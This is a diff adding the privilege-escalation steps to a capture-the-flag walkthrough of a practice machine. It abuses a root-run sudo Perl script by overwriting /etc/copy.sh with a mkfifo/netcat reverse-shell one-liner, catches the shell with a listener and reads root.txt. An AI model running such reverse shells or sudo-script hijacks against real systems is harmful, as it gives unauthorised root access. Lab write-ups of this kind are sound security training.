@@ -224,3 +224,77 @@ cd /home/itguy
 cat user.txt
 ```
 
+## Privilege Escalation
+19. by typing ```ls -l``` you will realised you have a read/write access to the ```backup.pl``` perl script.
+```bash
+www-data@THM-Chal:/home/itguy$ ls -l
+total 56
+drwxr-xr-x 2 itguy itguy 4096 Nov 29 11:26 Desktop
+drwxr-xr-x 2 itguy itguy 4096 Nov 29 11:26 Documents
+drwxr-xr-x 2 itguy itguy 4096 Nov 29 11:35 Downloads
+drwxr-xr-x 2 itguy itguy 4096 Nov 29 11:26 Music
+drwxr-xr-x 2 itguy itguy 4096 Nov 29 11:26 Pictures
+drwxr-xr-x 2 itguy itguy 4096 Nov 29 11:26 Public
+drwxr-xr-x 2 itguy itguy 4096 Nov 29 11:26 Templates
+drwxr-xr-x 2 itguy itguy 4096 Nov 29 11:26 Videos
+-rw-r--r-x 1 root  root    47 Nov 29 13:09 backup.pl
+-rw-r--r-- 1 itguy itguy 8980 Nov 29 00:35 examples.desktop
+-rw-rw-r-- 1 itguy itguy   16 Nov 29 12:35 mysql_login.txt
+-rw-rw-r-- 1 itguy itguy   38 Nov 29 12:33 user.txt
+```
+
+- You will also notice we can run as root aka ```sudo``` for backup.pl through ```sudo -l```
+```bash
+www-data@THM-Chal:/home/itguy$ sudo -l
+Matching Defaults entries for www-data on THM-Chal:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on THM-Chal:
+    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+www-data@THM-Chal:/home/itguy$ 
+```
+
+- reading the perl script through ```cat backup.pl```
+```bash
+www-data@THM-Chal:/home/itguy$ cat backup.pl
+#!/usr/bin/perl
+
+system("sh", "/etc/copy.sh");
+```
+
+- it redirect and run a copy.sh script. Lets take a look at whats inside ```copy.sh```
+```bash
+www-data@THM-Chal:/home/itguy$ cat /etc/copy.sh
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
+```
+- It is basically another reverse shell script. We will have to redirect the reverse shell to ourselves. But this server has no vi or vim. So we will do it through ```echo > copy.sh```
+```bash
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.141.19 9002 >/tmp/f" > /etc/copy.sh
+```
+20. We will run nc listener at port 9002 now with at a new terminal:
+```bash
+nc -lvnp 9002
+```
+- in the ```itguy``` terminal, run the perl script.
+```bash
+sudo /usr/bin/perl /home/itguy/backup.pl
+```
+
+- You will gain root access at your new terminal:
+```bash
+root@kali:~# nc -lvnp 9002
+listening on [any] 9002 ...
+connect to [10.10.141.19] from (UNKNOWN) [10.10.131.164] 54636
+# 
+```
+
+21. You can gain stable shell as above or just get the root.txt file
+```bash
+# whoami
+root
+# cd /root
+# ls
+root.txt
+# cat root.txt
+```
